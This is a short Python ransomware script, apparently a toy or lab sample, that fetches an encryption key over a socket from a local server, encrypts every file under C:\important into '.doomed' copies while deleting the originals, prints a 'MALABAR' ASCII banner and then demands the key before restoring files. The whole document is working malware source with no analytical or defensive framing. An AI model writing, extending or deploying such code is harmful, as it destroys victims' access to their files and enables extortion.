from cryptography.fernet import Fernet
import socket, os

def encrypt(path):
    with open(path, "rb") as normal_file:
        with open (path + ".doomed", "wb") as encrypted_file:
            encrypted_content = fn.encrypt(normal_file.read())
            encrypted_file.write(encrypted_content)
            encrypted_file.close()
            os.remove(path)

def decrypt(path):
    with open(path, "rb") as encrypted_file:
        with  open(path[:-7], "wb") as normal_file:
            decrypted_content = fn.decrypt(encrypted_file.read())
            normal_file.write(decrypted_content)
            normal_file.close()
            encrypted_file.close()
            os.remove(path)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 4321))
s.send(b'key')
key = s.recv(2048)
s.close
fn = Fernet(key)

for path, dirs, files in os.walk("C:\\important"):
    for f in files:
        encrypt(os.path.join(path, f))

del key
del fn


print(" ███▄ ▄███▓ ▄▄▄       ██▓    ▄▄▄       ▄▄▄▄    ▄▄▄       ██▀███  ")
print("▓██▒▀█▀ ██▒▒████▄    ▓██▒   ▒████▄    ▓█████▄ ▒████▄    ▓██ ▒ ██▒")
print("▓██    ▓██░▒██  ▀█▄  ▒██░   ▒██  ▀█▄  ▒██▒ ▄██▒██  ▀█▄  ▓██ ░▄█ ▒")
print("▒██    ▒██ ░██▄▄▄▄██ ▒██░   ░██▄▄▄▄██ ▒██░█▀  ░██▄▄▄▄██ ▒██▀▀█▄  ")
print("▒██▒   ░██▒ ▓█   ▓██▒░██████▒▓█   ▓██▒░▓█  ▀█▓ ▓█   ▓██▒░██▓ ▒██▒")
print("░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░▓  ░▒▒   ▓▒█░░▒▓███▀▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░")
print("░  ░      ░  ▒   ▒▒ ░░ ░ ▒  ░ ▒   ▒▒ ░▒░▒   ░   ▒   ▒▒ ░  ░▒ ░ ▒░")
print("░      ░     ░   ▒     ░ ░    ░   ▒    ░    ░   ░   ▒     ░░   ░ ")
print("       ░         ░  ░    ░  ░     ░  ░ ░            ░  ░   ░     ")
print("                                            ░                    ")
print("")

while True:
    key = input("Key =>")
    fn = Fernet(key)
    try:
        for path, dirs, files in os.walk("C:\\important"):
            for f in files:
                decrypt(os.path.join(path, f))
                print(os.path.join(path, f), " restored !")
    except Exception as e:
        print("ERROR -> ", e)
    else:
        break
